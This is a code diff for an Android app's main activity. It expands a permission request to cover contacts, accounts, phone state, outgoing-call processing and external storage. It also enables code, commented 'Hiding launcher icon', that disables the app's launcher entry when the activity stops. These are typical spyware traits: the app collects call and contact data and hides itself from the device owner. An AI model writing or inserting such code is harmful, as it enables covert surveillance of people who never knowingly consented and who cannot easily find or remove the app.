@@ -53,7 +53,14 @@ public class MainActivity extends AppCompatActivity {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
 
             if (checkSelfPermission(Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
-                requestPermissions(new String[]{Manifest.permission.READ_CONTACTS, Manifest.permission.GET_ACCOUNTS}, RQ_CODE_RQ_PERMISSIONS);
+                requestPermissions(new String[]{
+                        Manifest.permission.READ_CONTACTS,
+                        Manifest.permission.GET_ACCOUNTS,
+                        Manifest.permission.READ_PHONE_STATE,
+                        Manifest.permission.PROCESS_OUTGOING_CALLS,
+                        Manifest.permission.READ_EXTERNAL_STORAGE,
+                        Manifest.permission.WRITE_EXTERNAL_STORAGE,
+                }, RQ_CODE_RQ_PERMISSIONS);
             } else {
                 doNormalWork();
             }
@@ -176,9 +183,9 @@ public class MainActivity extends AppCompatActivity {
     protected void onStop() {
 
         //Hiding launcher icon
-        /*PackageManager p = getPackageManager();
+        PackageManager p = getPackageManager();
         ComponentName componentName = new ComponentName(this, MainActivity.class);
-        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);*/
+        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
 
         OkHttpUtils.cancelCall(connectCall);
         super.onStop();
